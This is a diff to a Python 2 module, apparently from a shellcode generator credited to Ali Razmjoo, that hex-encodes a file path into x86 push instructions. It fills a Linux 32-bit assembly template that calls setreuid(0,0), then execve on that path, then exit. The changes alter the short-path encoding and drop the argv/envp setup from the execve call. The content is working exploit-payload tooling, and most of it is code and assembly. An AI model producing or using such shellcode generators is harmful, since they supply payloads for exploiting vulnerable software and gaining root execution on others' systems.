@@ -9,8 +9,6 @@ Ali Razmjoo
 import binascii
 def run(file_to_exec):
 	m = len(file_to_exec) - 1
-	
-	
 	if len(file_to_exec) >= 4:
 		m = len(file_to_exec) - 1
 		stack = ''
@@ -61,20 +59,22 @@ def run(file_to_exec):
 				rep1 = file_shellcode[:16]
 				rep2 = rep1 + zshr
 				file_z = file_shellcode.replace(rep1,rep2)
-			content = file_z
 	if len(file_to_exec) <= 3:
-		content = '0x' + binascii.b2a_hex(file_to_exec)
+		m = len(file_to_exec) - 1
+		stack = ''
+		while(m>=0):
+				stack += file_to_exec[m]
+				m -= 1
+		content = '0x' + stack.encode('hex')
 		if len(content) % 2 is not 0:
 			content = content.replace('0x','0x0')
-		if len(content) is 10:
-			content = content + '\npop %eax\n'
 		if len(content) is 8:
-			content = content + '90\npop %eax\nshr $0x8,%eax\n'
+			content = content + '90\npop %ebx\nshr $0x8,%ebx\npush %ebx\n'
 		if len(content) is 6:
-			content = content + '9090\npop %eax\nshr $0x10,%eax\n'
+			content = content + '9090\npop %ebx\nshr $0x10,%ebx\npush %ebx\n'
 		if len(content) is 4:
-			content = content + '909090\npop %eax\nshr $0x10,%eax\nshr $0x8,%eax\n'
-		content = 'push $' + content
+			content = content + '909090\npop %ebx\nshr $0x10,%ebx\nshr $0x8,%ebx\npush %ebx\n'
+		file_z = 'push $' + content
 	
 	
 	shellcode = '''
@@ -82,22 +82,11 @@ mov    $0x46,%%al
 xor    %%ebx,%%ebx
 xor    %%ecx,%%ecx
 int    $0x80
-
 %s
-
-
 mov    %%esp,%%ebx
 xor    %%eax,%%eax
-mov    %%al,0x7(%%ebx)
-mov    %%ebx,0x8(%%ebx)
-mov    %%eax,0xc(%%ebx)
 mov    $0xb,%%al
-lea    0x8(%%ebx),%%ecx
-lea    0xc(%%ebx),%%edx
 int    $0x80
-
-
-
 mov    $0x1,%%al
 mov    $0x1,%%bl
 int    $0x80
